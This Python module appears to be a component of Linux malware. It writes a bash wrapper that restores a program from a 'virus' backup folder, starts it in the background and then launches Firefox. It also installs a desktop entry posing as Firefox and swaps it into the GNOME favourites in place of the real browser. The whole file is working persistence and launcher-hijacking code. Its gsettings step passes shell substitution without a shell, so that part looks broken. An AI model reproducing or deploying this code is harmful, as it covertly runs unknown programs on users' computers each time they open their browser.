import os
import subprocess
from pathlib import Path
from typing import Optional
from config import (SAVE_VIRUS_DIR, BACKUP_DIR, WRAPPER_DIR, WRAPPER_SCRIPT_NAME,
                    DESKTOP_ENTRY_NAME, DESKTOP_ENTRY_DIR, FIREFOX_BIN)
from utils import check_sum_content

def create_wrapper_script_content(progFileName: str, progFileBackup: str) -> Optional[str]:

    dirSaveVirus = os.path.expanduser(SAVE_VIRUS_DIR)
    backupDir = os.path.expanduser(BACKUP_DIR)

    wrapper_script_content = f"""
    ##!/bin/bash
   
    PROG="{dirSaveVirus}/{progFileName}"
    BACKUP="{backupDir}/{progFileBackup}"

    if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
        cp -a -- "$BACKUP" "$PROG"
        chmod +x -- "$PROG" || true
    fi

    if [ -x "$PROG" ]; then
        # cd "$HOME" || true
        "$PROG" &
        PROG_PID=$!
        echo "✅ PROG started with PID: $PROG_PID"
    fi

    # 3. Chạy Firefox sau
    exec "{FIREFOX_BIN}" "$@"

"""
    return wrapper_script_content

def install_desktop_entry(wrapper_script_content: str) -> bool:
    wrapper_dir = os.path.expanduser(WRAPPER_DIR)
    wrapper_path = Path(wrapper_dir) / WRAPPER_SCRIPT_NAME

    if wrapper_path.exists():
        existing_wrapper_content = wrapper_path.read_text()
        if check_sum_content(existing_wrapper_content) == check_sum_content(wrapper_script_content):
            print("Wrapper script already exists and is up to date.")
            return True

    try:
        wrapper_path.write_text(wrapper_script_content)
        wrapper_path.chmod(0o755)
    except Exception as e:
        print(f"Error writing wrapper script {wrapper_path}: {e}")
        return False

    desktop_entry_dir = os.path.expanduser(DESKTOP_ENTRY_DIR)
    desktop_entry_path = Path(desktop_entry_dir) / DESKTOP_ENTRY_NAME

    desktop_entry_content = f"""
    [Desktop Entry]
    Version=1.0
    Name=Firefox Web Browser (FAKE)
    Comment=Browse the World Wide Web
    Exec={wrapper_path} %u
    Icon=firefox
    Terminal=false
    Type=Application
    Categories=Network;WebBrowser;
    MimeType=text/html;text/xml;application/xhtml+xml;application/xml;application/rss+xml;
    StartupNotify=true
    """

    try:
        # Check if the file exists and the content has not changed then do nothing
        if desktop_entry_path.exists():
            existing_content = desktop_entry_path.read_text()
            if existing_content == desktop_entry_content:
                print("Desktop entry already exists and is up to date.")
                return True

        # Write desktop entry file
        print(f"Creating desktop entry: {desktop_entry_path}")
        desktop_entry_path.write_text(desktop_entry_content)

        # Add to favorites (GNOME-specific) thay firebox cũ bằng cái mới
        subprocess.run(["gsettings", "set", "org.gnome.shell", "favorite-apps",
                        f"$(gsettings get org.gnome.shell favorite-apps | sed 's/firefox.desktop/{DESKTOP_ENTRY_NAME}/')"],
                          check=True)

        return True
    except Exception as e:
        print(f"Error writing desktop entry {desktop_entry_path}: {e}")
        return False